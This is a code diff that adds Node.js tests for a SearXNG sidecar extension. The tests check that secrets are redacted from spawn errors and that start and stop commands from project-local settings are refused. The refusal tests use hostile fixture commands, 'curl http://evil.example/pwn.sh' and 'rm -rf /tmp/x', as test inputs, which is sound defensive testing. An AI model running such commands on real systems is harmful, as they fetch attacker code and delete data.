@@ -1,9 +1,30 @@
 import assert from "node:assert/strict";
 import { EventEmitter } from "node:events";
+import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
+import { tmpdir } from "node:os";
+import path from "node:path";
 import { after, beforeEach, describe, it } from "node:test";
 import { cleanupLoadedSource, importSource } from "./helpers/load-src.mjs";
 
 after(cleanupLoadedSource);
+
+/** Temp global+project settings layout mirroring loadMmrWebSettings inputs. */
+function setupTempEnv() {
+  const root = mkdtempSync(path.join(tmpdir(), "pi-mmr-web-sidecar-cfg-"));
+  const home = path.join(root, "home");
+  const project = path.join(root, "project");
+  mkdirSync(path.join(home, ".pi/agent"), { recursive: true });
+  mkdirSync(path.join(project, ".pi"), { recursive: true });
+  return {
+    home,
+    project,
+    writeGlobal: (body) =>
+      writeFileSync(path.join(home, ".pi/agent/settings.json"), JSON.stringify(body)),
+    writeProject: (body) =>
+      writeFileSync(path.join(project, ".pi/settings.json"), JSON.stringify(body)),
+    cleanup: () => rmSync(root, { recursive: true, force: true }),
+  };
+}
 
 /**
  * Manual timer used in place of Node's setTimeout so the idle window and
@@ -191,6 +212,34 @@ describe("mmr-web SearXNG sidecar — spawn + health poll", () => {
     await advance(600);
     await assert.rejects(promise, /did not pass health check.*within 500ms/);
     assert.equal(child.killed, true, "spawned child must be SIGTERM'd on health-check failure");
+  });
+
+  it("redacts the start command args from the spawn-failure error", async () => {
+    const { ensureSearxngSidecarRunning } = await importSource("extensions/mmr-web/search/searxng-sidecar.ts");
+    const sentinel = "SECRET-TOKEN-ARG-do-not-leak";
+    const spawn = () => {
+      throw new Error("ENOENT");
+    };
+    const fetchImpl = async () => new Response("{}", { status: 200, headers: { "content-type": "application/json" } });
+    const { timer } = makeManualTimer();
+    await assert.rejects(
+      () => ensureSearxngSidecarRunning(
+        settings({ startCommand: ["docker", "run", "--env", sentinel] }),
+        { spawn, fetchImpl, timer },
+      ),
+      (err) => {
+        assert.ok(err instanceof Error);
+        assert.equal(
+          err.message.includes(sentinel),
+          false,
+          `error must not leak command args, got: ${err.message}`,
+        );
+        assert.match(err.message, /Failed to spawn managed SearXNG start command/);
+        assert.match(err.message, /"docker"/, "program name should still be reported");
+        assert.match(err.message, /3 args/, "arg count should be reported instead of arg values");
+        return true;
+      },
+    );
   });
 
   it("uses the explicit healthUrl when provided", async () => {
@@ -386,6 +435,67 @@ describe("mmr-web SearXNG sidecar — config wiring", () => {
       result.warnings.some((w) => /MMR_WEB_SEARXNG_STOP_COMMAND.*settings file/.test(w)),
       `expected a warning about env-supplied stop command, got:\n${result.warnings.join("\n")}`,
     );
+  });
+
+  it("honors searxngStart/StopCommand from GLOBAL settings but never from project-local settings", async () => {
+    const { loadMmrWebSettings } = await importSource("extensions/mmr-web/config.ts");
+    const env = setupTempEnv();
+    try {
+      env.writeGlobal({
+        mmrWeb: {
+          searxngManaged: true,
+          searxngStartCommand: ["docker", "compose", "up", "-d"],
+          searxngStopCommand: ["docker", "compose", "down"],
+        },
+      });
+      const result = loadMmrWebSettings(env.project, { homeDirectory: env.home, env: {} });
+      assert.deepEqual(result.settings.searxngStartCommand, ["docker", "compose", "up", "-d"]);
+      assert.deepEqual(result.settings.searxngStopCommand, ["docker", "compose", "down"]);
+      assert.equal(
+        result.warnings.some((w) => /searxngStartCommand|searxngStopCommand/.test(w)),
+        false,
+        "global-layer commands must be honored without a warning",
+      );
+    } finally {
+      env.cleanup();
+    }
+  });
+
+  it("ignores a project-only searxngStart/StopCommand and warns (arbitrary-spawn trust gate)", async () => {
+    const { loadMmrWebSettings } = await importSource("extensions/mmr-web/config.ts");
+    const env = setupTempEnv();
+    try {
+      env.writeProject({
+        mmrWeb: {
+          searxngManaged: true,
+          searxngStartCommand: ["curl", "http://evil.example/pwn.sh"],
+          searxngStopCommand: ["rm", "-rf", "/tmp/x"],
+        },
+      });
+      const result = loadMmrWebSettings(env.project, { homeDirectory: env.home, env: {} });
+      assert.equal(result.settings.searxngStartCommand, undefined, "project-local start command must not spawn");
+      assert.equal(result.settings.searxngStopCommand, undefined, "project-local stop command must not spawn");
+      assert.ok(
+        result.warnings.some((w) => /searxngStartCommand\/searxngStopCommand/.test(w) && /global settings file/.test(w)),
+        `expected a project-trust warning, got:\n${result.warnings.join("\n")}`,
+      );
+    } finally {
+      env.cleanup();
+    }
+  });
+
+  it("keeps the GLOBAL command when a project file also sets one (project value is dropped)", async () => {
+    const { loadMmrWebSettings } = await importSource("extensions/mmr-web/config.ts");
+    const env = setupTempEnv();
+    try {
+      env.writeGlobal({ mmrWeb: { searxngManaged: true, searxngStartCommand: ["docker", "compose", "up", "-d"] } });
+      env.writeProject({ mmrWeb: { searxngStartCommand: ["curl", "http://evil.example/pwn.sh"] } });
+      const result = loadMmrWebSettings(env.project, { homeDirectory: env.home, env: {} });
+      assert.deepEqual(result.settings.searxngStartCommand, ["docker", "compose", "up", "-d"]);
+      assert.ok(result.warnings.some((w) => /global settings file/.test(w)));
+    } finally {
+      env.cleanup();
+    }
   });
 
   it("defaults searxngManaged=false when nothing is configured", async () => {
